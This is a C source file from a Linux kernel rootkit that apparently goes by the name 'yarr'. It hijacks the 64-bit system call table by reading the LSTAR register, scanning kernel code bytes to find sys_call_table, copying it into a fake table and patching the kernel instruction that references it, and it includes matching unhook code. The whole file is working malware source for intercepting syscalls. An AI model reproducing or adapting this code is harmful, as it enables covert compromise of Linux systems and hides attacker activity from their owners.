#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <asm/msr.h>
#include <asm/syscall.h>
#include <asm/paravirt.h>

#include "hook.h"
#include "log.h"
#include "utils.h"
#include "patch.h"

// TODO: Document all the functions using Doxygen format.

// Backup where we store the original sys_call_table.
unsigned long *sys_call_table_backup = NULL;
unsigned char *do_syscall_64_patch_addr = NULL;

// Our fake sys_call_table.
unsigned long fake_sct[__NR_syscall_max+1];

int __hook_syscall_table_64(void) {
    unsigned char *entry_SYSCALL_64, *do_syscall_64, *addr_e8, *addr_8b;
    int displacement, sct_addr_encoded, i, err;
    unsigned long addr;
    int32_t fake_sct_addr;

    // Get the address of the LSTAR MSR, it contains the entry point of
    // instruction syscall, entry_SYSCALL_64.
    rdmsrl(MSR_LSTAR, addr);
    entry_SYSCALL_64 = (unsigned char *)addr;
    if (entry_SYSCALL_64 == 0) {
        yarr_log("error retrieving MSR_LSTAR address");
        return -1;
    }

    // Look for the first e8 byte. This byte is the opcode for a
    // near/relative call instruction.
    //
    // TODO: This is broken, the kernels I'm working with meet the requirement
    // of the first e8-byte being part of the call instruction that has the
    // address of the next function to look into (do_syscall_64), but if the
    // code changes, the way of building the kernel (optimizations, etc)
    // changes, or anything else provokes the assembler to change then this
    // will fail miserably.
    addr_e8 = lookup_byte(entry_SYSCALL_64, '\xe8', 0);
    if (addr_e8 == NULL) {
        yarr_log("error while looking up call instruction opcode (e8)");
        return -1;
    }

    // Get the 4 bytes next to the call opcode (displacement).
    memcpy(&displacement, (void *)(addr_e8 + 1), 4);

    // Calculate the address of do_syscall_64. The + 5 is because the
    // displacement is relative to the next instruction. The call instruction
    // is 5-byte long, e8 <4-byte displacement>, so the next instruction is
    // in address addr_e8 + 5.
    do_syscall_64 = (void *)(addr_e8 + 5 + displacement);

    // its instructions, specifically mov <num>(,%rdi,8),%rax. Here <num> is
    // the encoded address of the sys_call_table. This instruction in 64-bit
    // code looks like 48 8b 04 fd 00 00 00 00, where the trailing zeroes are
    // <num>. I rather look for the 8b byte (less common), and by the time I
    // was writing this, I'm interested in the third ocurrence.
    //
    // TODO: As with the previous lookup, this is broken if something changes
    // the assembler.
    addr_8b = lookup_byte(do_syscall_64, '\x8b', 2);

    // Get the 4 bytes we are interested in.
    memcpy(&sct_addr_encoded, (void *)(addr_8b + 3), 4);

    // Now we know the address of sys_call_table, back it up for when we
    // unload. We promote first to long so there's sign extension and then to 
    // pointer so we omit a warning.
    sys_call_table_backup = (void *)(long)sct_addr_encoded;
    yarr_log("sys_call_table found at 0x%px", sys_call_table_backup);
    yarr_log("fake sct is at 0x%px", fake_sct);

    // Fulfill our fake sys_call_table with the real syscalls.
    for (i = 0; i < __NR_syscall_max + 1; i++) {
        fake_sct[i] = sys_call_table_backup[i];
    }

    // Now we patch the instruction from where we got the sys_call_table
    // with our fake sys_call_table.
    //
    // TODO: This global should disappear when the patch subsystem is
    // developed.
    do_syscall_64_patch_addr = addr_8b + 3;
    fake_sct_addr = get_low_4_bytes((unsigned long)&fake_sct);
    err = patch((unsigned char *)(addr_8b + 3),
            (unsigned char *)&(fake_sct_addr),
            4);
    if (err) {
        yarr_log("error patching the sys_call_table");
        return -1;
    }

    return 0;
}

int __unhook_syscall_table_64(void) {
    int err;
    int32_t orig_sct_addr;

    if (sys_call_table_backup == NULL) {
        yarr_log("sys_call_table_backup is NULL");
        return -1;
    }

    // TODO: For now I undo the sys_call_table hook using patch, however we
    // don't want this. We want to tell the patch subsystem to undo all the
    // patches it's been tracking.
    orig_sct_addr = get_low_4_bytes((unsigned long)sys_call_table_backup);
    err = patch(do_syscall_64_patch_addr, (unsigned char *)&orig_sct_addr, 4);
    if (err) {
        yarr_log("error unpatching do_syscall_64");
        return -1;
    }

    return 0;
}

// TODO: For now I'm forcing the rootkit to work just on 64-bit kernels.
int hook_syscall_tables(void) {
    int err;

    // Hook the 64-bit system call table.
    err = __hook_syscall_table_64();
    if (err) {
        yarr_log("error hooking sys_call_table for 64-bit");
    }

    // TODO: Hook the 32-bit system call table.

    return 0;
}

int unhook_syscall_tables(void) {
    int err;

    // Unhook the 64-bit system call table.
    err = __unhook_syscall_table_64();
    if (err) {
        yarr_log("error unhooking sys_call_table for 64-bit");
    }

    // TODO: Unhook the 32-bit system call table.

    return 0;
}

